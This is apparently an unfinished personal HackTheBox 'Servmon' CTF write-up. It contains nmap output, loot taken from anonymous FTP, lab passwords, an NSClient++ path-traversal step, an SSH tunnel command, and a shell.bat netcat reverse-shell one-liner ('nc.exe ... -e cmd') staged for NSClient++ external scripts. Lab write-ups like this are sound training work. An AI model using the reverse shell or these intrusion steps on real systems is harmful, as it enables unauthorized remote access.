---
title: "Servmon"
date: 2026-03-03
draft: false
description: "HackTheBox Servmon writeup"
tags: ["hackthebox", "htb", "windows", "easy", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Servmon

## Overview

- **OS:** Windows
- **IP:** 10.129.95.122
- **Difficulty:** Easy
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** N/A

### Summary

Got initial access via path traversal and then port forwarded w ssh, api broken cant get root.txt.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames | Nadine, Nathan |
| Passwords | 1nsp3ctTh3Way2Mars!

Th3r34r3To0M4nyTrait0r5!

B3WithM30r4ga1n5tMe

L1k3B1gBut7s@W0rk

0nly7h3y0unGWi11F0l10w

IfH3s4b0Utg0t0H1sH0me

Gr4etN3w5w17hMySk1Pa5$

ew2x6SsGTxjRwXOT |
| Usernames+Passwords | Nadine:L1k3B1gBut7s@W0rk  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-03 06:02 EST
Nmap scan report for 10.129.227.77
Host is up (0.12s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
**| ftp-anon: Anonymous FTP login allowed (FTP code 230)**
|_02-28-22  06:35PM       <DIR>          Users
**22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)**
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
**80/tcp   open  http**
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
**8443/tcp open  ssl/https-alt**
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
|_ssl-date: TLS randomness does not represent time
**| http-title: NSClient++**
|_Requested resource was /index.html
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.95%I=7%D=3/3%Time=69A6BFC3%P=x86_64-pc-linux-gnu%r(NULL,
SF:6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\
SF:r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text
SF:/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x2
SF:0\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XH
SF:TML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DT
SF:D/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.o
SF:rg/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x
SF:20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20
SF:\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%
SF:r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html
SF:\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x
SF:201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xht
SF:ml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/19
SF:99/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x2
SF:0\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\
SF:x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTS
SF:PRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nC
SF:ontent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\
SF:xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.
SF:0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-t
SF:ransitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xh
SF:tml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20
SF:<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x
SF:20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=3/3%Time=69A6BFCC%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation:
SF:\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\x04jobs\x12\x02\x18
SF:\x0b\x12\x0f")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2
SF:018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1
SF:\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RT
SF:SPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument
SF:\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:
SF:\x2018\r\n\r\nDocument\x20not\x20found");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
| smb2-time: 
|   date: 2026-03-03T11:04:56
|_  start_date: N/A

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   114.12 ms 10.10.14.1
2   114.31 ms 10.129.227.77

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 179.12 seconds
```

{{< figure src="image 487.png" >}}

## Dirbusting

{{< figure src="image 488.png" >}}

Nothing w dirbuster on the other one either, anways lets come back here if we get stuck

## Port 21

Since FTP was open with anon login lets check it out

we find the users Nadine Nathan lets add them to our users.txt

{{< figure src="image 489.png" >}}

Nadine had a confidential txt

```
Nathan,

**I left your Passwords.txt file on your Desktop.**  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine 
```

So nathan has a passwords txt file on his desktop interesting, we might have to get thru nathan first then

and Nathan had a todo list

```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint                                                                            
```

and the secret files are apparently in some sharepoint

## Subd

No subdomains either

{{< figure src="image 490.png" >}}

## Port 80

{{< figure src="image 491.png" >}}

## Port 8443

{{< figure src="image 492.png" >}}

## Exploitation

So this service apparently has a LFI exploit

{{< figure src="image 493.png" >}}

lemme use this to try nd grab the passwords.txt file

{{< figure src="image 494.png" >}}

AHHH lets go thru others

well it worked manually…

{{< figure src="image 495.png" >}}

great now lets use this w the user list against the ssh port

{{< figure src="image 496.png" >}}

shell access 

## Shell as Nadine

{{< figure src="image 497.png" >}}

No interesting privs

{{< figure src="image 498.png" >}}

i only have access to nadines folder… lets see if we find anything interesting here

looking at ncs++ in the programs folder we are able to find a .ini config file with this password

{{< figure src="image 499.png" >}}

lets see if we can use it for nathan

and we have the version also 

```
nadine@SERVMON C:\Program Files\NSClient++>nscp --version
NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
```

Not able to login tho

{{< figure src="image 500.png" >}}

{{< figure src="image 501.png" >}}

Apparently only the [localhost](http://localhost) is allowed, so we might have to do some portforwarding

lets tunnel w ssh

```
sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443 , basically 127.0.0.1:8443 on the first port
```

lets get shell.bat and nc over on the system

**shell.bat**

```
\programdata\nc.exe 10.10.14.24 443 -e cmd
```

Settings > external scripts > scripts, and then “+Add new”.

{{< figure src="image 502.png" >}}

{{< figure src="image 503.png" >}}

{{< figure src="image 504.png" >}}
